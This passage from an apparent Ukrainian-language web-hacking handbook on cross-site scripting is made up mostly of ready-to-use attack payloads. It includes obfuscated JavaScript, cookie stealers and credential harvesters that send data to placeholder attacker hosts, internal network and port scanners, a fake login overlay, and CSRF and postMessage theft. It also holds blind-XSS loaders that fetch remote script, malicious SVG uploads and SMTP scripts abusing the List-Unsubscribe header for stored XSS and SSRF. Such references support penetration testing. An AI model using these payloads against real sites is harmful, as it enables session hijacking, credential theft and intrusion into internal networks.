ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
(ﾟｰﾟ + (o ^ _ ^ o)) +
ﾟДﾟ[ﾟεﾟ] +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟｰﾟ +
(c ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟΘﾟ +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
ﾟΘﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
ﾟΘﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) - ﾟΘﾟ) +
(o ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
(o ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟΘﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
(c ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟｰﾟ +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟΘﾟ +
ﾟДﾟ[ﾟoﾟ]
)(ﾟΘﾟ)
)("_")
```

```javascript
// It's also possible to execute JS code only with the chars: []`+!${}
```
## XSS: поширені payloads

### Кілька payloads в 1


{{#ref}}
steal-info-js.md
{{#endref}}

### Iframe Trap

Змусити користувача залишатися на сторінці в iframe і викрадати його дії (включно з інформацією, що надсилається у формах):


{{#ref}}
../iframe-traps.md
{{#endref}}

### Отримати Cookies
```javascript
<img src=x onerror=this.src="http://<YOUR_SERVER_IP>/?c="+document.cookie>
<img src=x onerror="location.href='http://<YOUR_SERVER_IP>/?c='+ document.cookie">
<script>new Image().src="http://<IP>/?c="+encodeURI(document.cookie);</script>
<script>new Audio().src="http://<IP>/?c="+escape(document.cookie);</script>
<script>location.href = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>location = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>document.location = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>document.location.href = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>document.write('<img src="http://<YOUR_SERVER_IP>?c='+document.cookie+'" />')</script>
<script>window.location.assign('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
<script>window['location']['assign']('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
<script>window['location']['href']('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
<script>document.location=["http://<YOUR_SERVER_IP>?c",document.cookie].join()</script>
<script>var i=new Image();i.src="http://<YOUR_SERVER_IP>/?c="+document.cookie</script>
<script>window.location="https://<SERVER_IP>/?c=".concat(document.cookie)</script>
<script>var xhttp=new XMLHttpRequest();xhttp.open("GET", "http://<SERVER_IP>/?c="%2Bdocument.cookie, true);xhttp.send();</script>
<script>eval(atob('ZG9jdW1lbnQud3JpdGUoIjxpbWcgc3JjPSdodHRwczovLzxTRVJWRVJfSVA+P2M9IisgZG9jdW1lbnQuY29va2llICsiJyAvPiIp'));</script>
<script>fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net', {method: 'POST', mode: 'no-cors', body:document.cookie});</script>
<script>navigator.sendBeacon('https://ssrftest.com/x/AAAAA',document.cookie)</script>
```
> [!TIP]
> Ви **не зможете отримати доступ до cookies з JavaScript**, якщо в cookie встановлено прапорець HTTPOnly. Але тут є [деякі способи bypass цього захисту](../hacking-with-cookies/index.html#httponly), якщо пощастить.

### Вкрасти вміст сторінки
```javascript
var url = "http://10.10.10.25:8000/vac/a1fbf2d1-7c3f-48d2-b0c3-a205e54e09e8"
var attacker = "http://10.10.14.8/exfil"
var xhr = new XMLHttpRequest()
xhr.onreadystatechange = function () {
if (xhr.readyState == XMLHttpRequest.DONE) {
fetch(attacker + "?" + encodeURI(btoa(xhr.responseText)))
}
}
xhr.open("GET", url, true)
xhr.send(null)
```
### Знайти внутрішні IP-адреси
```html
<script>
var q = []
var collaboratorURL =
"http://5ntrut4mpce548i2yppn9jk1fsli97.burpcollaborator.net"
var wait = 2000
var n_threads = 51

// Prepare the fetchUrl functions to access all the possible
for (i = 1; i <= 255; i++) {
q.push(
(function (url) {
return function () {
fetchUrl(url, wait)
}
})("http://192.168.0." + i + ":8080")
)
}

// Launch n_threads threads that are going to be calling fetchUrl until there is no more functions in q
for (i = 1; i <= n_threads; i++) {
if (q.length) q.shift()()
}

function fetchUrl(url, wait) {
console.log(url)
var controller = new AbortController(),
signal = controller.signal
fetch(url, { signal })
.then((r) =>
r.text().then((text) => {
location =
collaboratorURL +
"?ip=" +
url.replace(/^http:\/\//, "") +
"&code=" +
encodeURIComponent(text) +
"&" +
Date.now()
})
)
.catch((e) => {
if (!String(e).includes("The user aborted a request") && q.length) {
q.shift()()
}
})

setTimeout((x) => {
controller.abort()
if (q.length) {
q.shift()()
}
}, wait)
}
</script>
```
### Port Scanner (fetch)
```javascript
const checkPort = (port) => { fetch(http://localhost:${port}, { mode: "no-cors" }).then(() => { let img = document.createElement("img"); img.src = http://attacker.com/ping?port=${port}; }); } for(let i=0; i<1000; i++) { checkPort(i); }
```
### Port Scanner (websockets)
```python
var ports = [80, 443, 445, 554, 3306, 3690, 1234];
for(var i=0; i<ports.length; i++) {
var s = new WebSocket("wss://192.168.1.1:" + ports[i]);
s.start = performance.now();
s.port = ports[i];
s.onerror = function() {
console.log("Port " + this.port + ": " + (performance.now() -this.start) + " ms");
};
s.onopen = function() {
console.log("Port " + this.port+ ": " + (performance.now() -this.start) + " ms");
};
}
```
_Короткий час вказує на порт, що відповідає_ _Довший час вказує на відсутність відповіді._

Перегляньте список портів, заборонених у Chrome [**here**](https://src.chromium.org/viewvc/chrome/trunk/src/net/base/net_util.cc) та у Firefox [**here**](https://www-archive.mozilla.org/projects/netlib/portbanning#portlist).

### Блок для запиту облікових даних
```html
<style>::placeholder { color:white; }</style><script>document.write("<div style='position:absolute;top:100px;left:250px;width:400px;background-color:white;height:230px;padding:15px;border-radius:10px;color:black'><form action='https://example.com/'><p>Your sesion has timed out, please login again:</p><input style='width:100%;' type='text' placeholder='Username' /><input style='width: 100%' type='password' placeholder='Password'/><input type='submit' value='Login'></form><p><i>This login box is presented using XSS as a proof-of-concept</i></p></div>")</script>
```
### Перехоплення паролів автозаповнення
```javascript
<b>Username:</><br>
<input name=username id=username>
<b>Password:</><br>
<input type=password name=password onchange="if(this.value.length)fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```
Коли будь-які дані вводяться в поле пароля, ім'я користувача й пароль відправляються на сервер атакуючого; навіть якщо клієнт обирає збережений пароль і нічого не вводить, облікові дані будуть ex-filtrated.

### Hijack form handlers to exfiltrate credentials (const shadowing)

Якщо критичний обробник (наприклад, `function DoLogin(){...}`) оголошено пізніше на сторінці, а ваш payload виконується раніше (наприклад, через inline JS-in-JS sink), визначте `const` з тим самим ім'ям першочергово, щоб перехопити й замкнути обробник. Пізніші оголошення функцій не зможуть повторно прив'язати ім'я `const`, залишивши ваш hook під контролем:
```javascript
const DoLogin = () => {
const pwd  = Trim(FormInput.InputPassword.value);
const user = Trim(FormInput.InputUtente.value);
fetch('https://attacker.example/?u='+encodeURIComponent(user)+'&p='+encodeURIComponent(pwd));
};
```
Примітки
- Це залежить від порядку виконання: ваша ін'єкція має виконатися до легітимного оголошення.
- Якщо ваш payload загорнуто в `eval(...)`, зв'язування через `const/let` не стануть глобальними. Використайте динамічну ін'єкцію `<script>` з розділу “Deliverable payloads with eval(atob()) and scope nuances” щоб забезпечити справжнє глобальне, нездатне до перевизначення зв'язування.
- Коли фільтри за ключовими словами блокують код, комбінуйте з Unicode-escaped ідентифікаторами або доставкою через `eval(atob('...'))`, як показано вище.

### Keylogger

Просто шукаючи на github, я знайшов кілька різних:

- [https://github.com/JohnHoder/Javascript-Keylogger](https://github.com/JohnHoder/Javascript-Keylogger)
- [https://github.com/rajeshmajumdar/keylogger](https://github.com/rajeshmajumdar/keylogger)
- [https://github.com/hakanonymos/JavascriptKeylogger](https://github.com/hakanonymos/JavascriptKeylogger)
- Також можна використати metasploit `http_javascript_keylogger`

### Викрадення CSRF токенів
```javascript
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/email',true);
req.send();
function handleResponse() {
var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
var changeReq = new XMLHttpRequest();
changeReq.open('post', '/email/change-email', true);
changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```
### Викрадення повідомлень PostMessage
```html
<img src="https://attacker.com/?" id=message>
<script>
window.onmessage = function(e){
document.getElementById("message").src += "&"+e.data;
</script>
```
### Abusing Service Workers


{{#ref}}
abusing-service-workers.md
{{#endref}}

### Accessing Shadow DOM


{{#ref}}
shadow-dom.md
{{#endref}}

### Polyglots


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/xss_polyglots.txt
{{#endref}}

### Blind XSS payloads

Ви також можете використовувати: [https://xsshunter.com/](https://xsshunter.com)
```html
"><img src='//domain/xss'>
"><script src="//domain/xss.js"></script>
><a href="javascript:eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">Click Me For An Awesome Time</a>
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//0mnb1tlfl5x4u55yfb57dmwsajgd42.burpcollaborator.net/scriptb");a.send();</script>

<!-- html5sec - Self-executing focus event via autofocus: -->
"><input onfocus="eval('d=document; _ = d.createElement(\'script\');_.src=\'\/\/domain/m\';d.body.appendChild(_)')" autofocus>

<!-- html5sec - JavaScript execution via iframe and onload -->
"><iframe onload="eval('d=document; _=d.createElement(\'script\');_.src=\'\/\/domain/m\';d.body.appendChild(_)')">

<!-- html5sec - SVG tags allow code to be executed with onload without any other elements. -->
"><svg onload="javascript:eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')" xmlns="http://www.w3.org/2000/svg"></svg>

<!-- html5sec -  allow error handlers in <SOURCE> tags if encapsulated by a <VIDEO> tag. The same works for <AUDIO> tags  -->
"><video><source onerror="eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">

<!--  html5sec - eventhandler -  element fires an "onpageshow" event without user interaction on all modern browsers. This can be abused to bypass blacklists as the event is not very well known.  -->
"><body onpageshow="eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">

<!-- xsshunter.com - Sites that use JQuery -->
<script>$.getScript("//domain")</script>

<!-- xsshunter.com - When <script> is filtered -->
"><img src=x id=payload&#61;&#61; onerror=eval(atob(this.id))>

<!-- xsshunter.com - Bypassing poorly designed systems with autofocus -->
"><input onfocus=eval(atob(this.id)) id=payload&#61;&#61; autofocus>

<!-- noscript trick -->
<noscript><p title="</noscript><img src=x onerror=alert(1)>">

<!-- whitelisted CDNs in CSP -->
"><script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.1/angular.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.1/angular.min.js"></script>
<!-- ... add more CDNs, you'll get WARNING: Tried to load angular more than once if multiple load. but that does not matter you'll get a HTTP interaction/exfiltration :-]... -->
<div ng-app ng-csp><textarea autofocus ng-focus="d=$event.view.document;d.location.hash.match('x1') ? '' : d.location='//localhost/mH/'"></textarea></div>

<!-- Payloads from https://www.intigriti.com/researchers/blog/hacking-tools/hunting-for-blind-cross-site-scripting-xss-vulnerabilities-a-complete-guide -->
<!-- Image tag -->
'"><img src="x" onerror="eval(atob(this.id))" id="Y29uc3QgeD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTt4LnNyYz0ne1NFUlZFUn0vc2NyaXB0LmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHgpOw==">

<!-- Input tag with autofocus -->
'"><input autofocus onfocus="eval(atob(this.id))" id="Y29uc3QgeD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTt4LnNyYz0ne1NFUlZFUn0vc2NyaXB0LmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHgpOw==">

<!-- In case jQuery is loaded, we can make use of the getScript method -->
'"><script>$.getScript("{SERVER}/script.js")</script>

<!-- Make use of the JavaScript protocol (applicable in cases where your input lands into the "href" attribute or a specific DOM sink) -->
javascript:eval(atob("Y29uc3QgeD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTt4LnNyYz0ne1NFUlZFUn0vc2NyaXB0LmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHgpOw=="))

<!-- Render an iframe to validate your injection point and receive a callback -->
'"><iframe src="{SERVER}"></iframe>

<!-- Bypass certain Content Security Policy (CSP) restrictions with a base tag -->
<base href="{SERVER}" />

<!-- Make use of the meta-tag to initiate a redirect -->
<meta http-equiv="refresh" content="0; url={SERVER}" />

<!-- In case your target makes use of AngularJS -->
{{constructor.constructor("import('{SERVER}/script.js')")()}}
```
### Regex - Доступ до прихованого вмісту

З [**цього розбору**](https://blog.arkark.dev/2022/11/18/seccon-en/#web-piyosay) можна дізнатися, що навіть якщо деякі значення зникають із JS, їх все ще можна знайти в JS-атрибутах у різних об'єктах. Наприклад, введене в REGEX значення все ще можна знайти після того, як значення input для regex було видалено:
```javascript
// Do regex with flag
flag = "CTF{FLAG}"
re = /./g
re.test(flag)

// Remove flag value, nobody will be able to get it, right?
flag = ""

// Access previous regex input
console.log(RegExp.input)
console.log(RegExp.rightContext)
console.log(
document.all["0"]["ownerDocument"]["defaultView"]["RegExp"]["rightContext"]
)
```
### Список Brute-Force


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/xss.txt
{{#endref}}

## XSS: використання інших вразливостей

### XSS у Markdown

Можна ввести Markdown-код, який буде відрендерено? Можливо, ви отримаєте XSS! Перевірте:


{{#ref}}
xss-in-markdown.md
{{#endref}}

### XSS у SSRF

Отримали XSS на **сайті, який використовує кешування**? Спробуйте **ескалювати це до SSRF** через Edge Side Include Injection за допомогою такого payload:
```python
<esi:include src="http://yoursite.com/capture" />
```
Використовуйте це, щоб обійти cookie restrictions, XSS filters і багато іншого!\  
More information about this technique here: [**XSLT**](../xslt-server-side-injection-extensible-stylesheet-language-transformations.md).

### XSS у динамічно створюваному PDF

Якщо веб-сторінка створює PDF, використовуючи user controlled input, ви можете спробувати **обдурити the bot**, який створює PDF, щоб він **виконав довільний JS код**.\  
Отже, якщо **PDF creator bot finds** певні **HTML** **tags**, він їх **інтерпретуватиме**, і ви можете **зловживати** цією поведінкою, щоб спричинити **Server XSS**.


{{#ref}}
server-side-xss-dynamic-pdf.md
{{#endref}}

Якщо ви не можете inject HTML tags, варто спробувати **inject PDF data**:


{{#ref}}
pdf-injection.md
{{#endref}}

### XSS у Amp4Email

AMP, спрямований на пришвидшення продуктивності веб-сторінок на мобільних пристроях, використовує HTML tags, доповнені JavaScript, щоб забезпечити функціональність з акцентом на швидкість і безпеку. Він підтримує низку компонентів для різних можливостей, доступних через [AMP components](https://amp.dev/documentation/components/?format=websites).

Формат [**AMP for Email**](https://amp.dev/documentation/guides-and-tutorials/learn/email-spec/amp-email-format/) розширює окремі AMP components для emailів, дозволяючи отримувачам взаємодіяти з контентом безпосередньо в своїх листах.

Приклад [**writeup XSS in Amp4Email in Gmail**](https://adico.me/post/xss-in-gmail-s-amp4email).

### Зловживання заголовком List-Unsubscribe (Webmail XSS & SSRF)

RFC 2369 заголовок `List-Unsubscribe` вбудовує attacker-controlled URIs, які багато веб-поштових і mail clients автоматично перетворюють у "Unsubscribe" кнопки. Коли ці URIs рендеряться або витягуються без валідації, заголовок стає точкою інжекції як для stored XSS (якщо unsubscribe link розміщено в DOM), так і для SSRF (якщо сервер виконує unsubscribe запит від імені користувача).

#### Stored XSS via `javascript:` URIs

1. **Надішліть собі лист**, де заголовок вказує на `javascript:` URI, при цьому решта повідомлення має бути доброзичливою, щоб spam filters не відкинули його.
2. **Переконайтеся, що UI рендерить значення** (багато клієнтів показують його в "List Info" панелі) і перевірте, чи отриманий `<a>` tag успадковує attacker-controlled атрибути, такі як `href` або `target`.
3. **Спровокуйте виконання** (наприклад, CTRL+click, middle-click, або "open in new tab"), коли лінк використовує `target="_blank"`; браузери оцінять переданий JavaScript в origin веб-поштового додатка.
4. Спостерігайте примітив stored-XSS: payload зберігається разом із листом і вимагає лише кліку для виконання.
```text
List-Unsubscribe: <javascript://attacker.tld/%0aconfirm(document.domain)>
List-Unsubscribe-Post: List-Unsubscribe=One-Click
```
Байт нового рядка (`%0a`) у URI показує, що навіть незвичні символи проходять через pipeline рендерингу у вразливих клієнтів, таких як Horde IMP H5, які виводять рядок дослівно всередині тегу <a>.

<details>
<summary>Мінімальний SMTP PoC, який доставляє шкідливий заголовок List-Unsubscribe</summary>
```python
#!/usr/bin/env python3
import smtplib
from email.message import EmailMessage

smtp_server = "mail.example.org"
smtp_port = 587
smtp_user = "user@example.org"
smtp_password = "REDACTED"
sender = "list@example.org"
recipient = "victim@example.org"

msg = EmailMessage()
msg.set_content("Testing List-Unsubscribe rendering")
msg["From"] = sender
msg["To"] = recipient
msg["Subject"] = "Newsletter"
msg["List-Unsubscribe"] = "<javascript://evil.tld/%0aconfirm(document.domain)>"
msg["List-Unsubscribe-Post"] = "List-Unsubscribe=One-Click"

with smtplib.SMTP(smtp_server, smtp_port) as smtp:
smtp.starttls()
smtp.login(smtp_user, smtp_password)
smtp.send_message(msg)
```
</details>

#### Проксі відписки на стороні сервера -> SSRF

Деякі клієнти, наприклад Nextcloud Mail app, проксують дію відписки на стороні сервера: натискання кнопки дає серверу вказівку самостійно звернутися до вказаного URL. Це перетворює заголовок на SSRF-примітив, особливо коли адміністратори встановлюють `'allow_local_remote_servers' => true` (задокументовано в [HackerOne report 2902856](https://hackerone.com/reports/2902856)), що дозволяє запити до loopback і діапазонів RFC1918.

1. **Підготуйте електронний лист**, у якому `List-Unsubscribe` вказує на endpoint, контрольований атакуючим (для blind SSRF використовуйте Burp Collaborator / OAST).
2. **Залиште `List-Unsubscribe-Post: List-Unsubscribe=One-Click`**, щоб UI показував кнопку відписки в один клік.
3. **Виконайте вимоги довіри**: Nextcloud, наприклад, виконує HTTPS-запити для відписки лише коли повідомлення проходить DKIM, тому атакуючий має підписати лист доменом, яким він керує.
4. **Доставте повідомлення до поштової скриньки, яку обробляє цільовий сервер**, і дочекайтесь, поки користувач натисне кнопку відписки.
5. **Спостерігайте server-side callback** на collaborator endpoint, потім pivot до internal addresses, коли примітив підтверджено.
```text
List-Unsubscribe: <http://abcdef.oastify.com>
List-Unsubscribe-Post: List-Unsubscribe=One-Click
```
<details>
<summary>DKIM-підписане List-Unsubscribe повідомлення для тестування SSRF</summary>
```python
#!/usr/bin/env python3
import smtplib
from email.message import EmailMessage
import dkim

smtp_server = "mail.example.org"
smtp_port = 587
smtp_user = "user@example.org"
smtp_password = "REDACTED"
dkim_selector = "default"
dkim_domain = "example.org"
dkim_private_key = """-----BEGIN PRIVATE KEY-----\n...\n-----END PRIVATE KEY-----"""

msg = EmailMessage()
msg.set_content("One-click unsubscribe test")
msg["From"] = "list@example.org"
msg["To"] = "victim@example.org"
msg["Subject"] = "Mailing list"
msg["List-Unsubscribe"] = "<http://abcdef.oastify.com>"
msg["List-Unsubscribe-Post"] = "List-Unsubscribe=One-Click"

raw = msg.as_bytes()
signature = dkim.sign(
message=raw,
selector=dkim_selector.encode(),
domain=dkim_domain.encode(),
privkey=dkim_private_key.encode(),
include_headers=["From", "To", "Subject"]
)
msg["DKIM-Signature"] = signature.decode().split(": ", 1)[1].replace("\r", "").replace("\n", "")

with smtplib.SMTP(smtp_server, smtp_port) as smtp:
smtp.starttls()
smtp.login(smtp_user, smtp_password)
smtp.send_message(msg)
```
</details>

**Примітки тестування**

- Використовуйте OAST endpoint для збору blind SSRF hits, потім адаптуйте `List-Unsubscribe` URL, щоб спрямувати на `http://127.0.0.1:PORT`, служби метаданих або інші внутрішні хости після підтвердження примітиву.
- Оскільки unsubscribe helper часто повторно використовує той самий HTTP stack, що й застосунок, ви успадковуєте його proxy settings, HTTP verbs і header rewrites, що дає змогу застосувати подальші traversal tricks, описані в [SSRF methodology](../ssrf-server-side-request-forgery/README.md).

### XSS — завантаження файлів (svg)

Завантажте як зображення файл, подібний до наведеного нижче (з [http://ghostlulz.com/xss-svg/](http://ghostlulz.com/xss-svg/)):
```html
Content-Type: multipart/form-data; boundary=---------------------------232181429808
Content-Length: 574
-----------------------------232181429808
Content-Disposition: form-data; name="img"; filename="img.svg"
Content-Type: image/svg+xml

<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
<script type="text/javascript">
alert(1);
</script>
</svg>
-----------------------------232181429808--
```

```html
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<script type="text/javascript">alert("XSS")</script>
</svg>
```

```html
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
<script type="text/javascript">
alert("XSS");
</script>
</svg>
```

```svg
<svg width="500" height="500"
xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<circle cx="50" cy="50" r="45" fill="green"
id="foo"/>

<foreignObject width="500" height="500">
<iframe xmlns="http://www.w3.org/1999/xhtml" src="data:text/html,&lt;body&gt;&lt;script&gt;document.body.style.background=&quot;red&quot;&lt;/script&gt;hi&lt;/body&gt;" width="400" height="250"/>
<iframe xmlns="http://www.w3.org/1999/xhtml" src="javascript:document.write('hi');" width="400" height="250"/>
</foreignObject>
</svg>
```

```html
<svg><use href="//portswigger-labs.net/use_element/upload.php#x" /></svg>
```

```xml
<svg><use href="data:image/svg+xml,&lt;svg id='x' xmlns='http://www.w3.org/2000/svg' &gt;&lt;image href='1' onerror='alert(1)' /&gt;&lt;/svg&gt;#x" />
```
Знайдіть **більше SVG payloads у** [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)

## Різні JS трюки та відповідна інформація


{{#ref}}
other-js-tricks.md
{{#endref}}

## Ресурси XSS

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection)
- [http://www.xss-payloads.com](http://www.xss-payloads.com) [https://github.com/Pgaijin66/XSS-Payloads/blob/master/payload.txt](https://github.com/Pgaijin66/XSS-Payloads/blob/master/payload.txt) [https://github.com/materaj/xss-list](https://github.com/materaj/xss-list)
- [https://github.com/ismailtasdelen/xss-payload-list](https://github.com/ismailtasdelen/xss-payload-list)
- [https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec](https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec)
- [https://netsec.expert/2020/02/01/xss-in-2020.html](https://netsec.expert/2020/02/01/xss-in-2020.html)
- [https://www.intigriti.com/researchers/blog/hacking-tools/hunting-for-blind-cross-site-scripting-xss-vulnerabilities-a-complete-guide](https://www.intigriti.com/researchers/blog/hacking-tools/hunting-for-blind-cross-site-scripting-xss-vulnerabilities-a-complete-guide)

## Посилання

- [Turning a harmless XSS behind a WAF into a realistic phishing vector](https://blog.hackcommander.com/posts/2025/12/28/turning-a-harmless-xss-behind-a-waf-into-a-realistic-phishing-vector/)
- [XSS and SSRF via the List-Unsubscribe SMTP Header in Horde Webmail and Nextcloud Mail](https://security.lauritz-holtmann.de/post/xss-ssrf-list-unsubscribe/)
- [HackerOne Report #2902856 - Nextcloud Mail List-Unsubscribe SSRF](https://hackerone.com/reports/2902856)
- [From "Low-Impact" RXSS to Credential Stealer: A JS-in-JS Walkthrough](https://r3verii.github.io/bugbounty/2025/08/25/rxss-credential-stealer.html)
- [MDN eval()](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval)

{{#include ../../banners/hacktricks-training.md}}
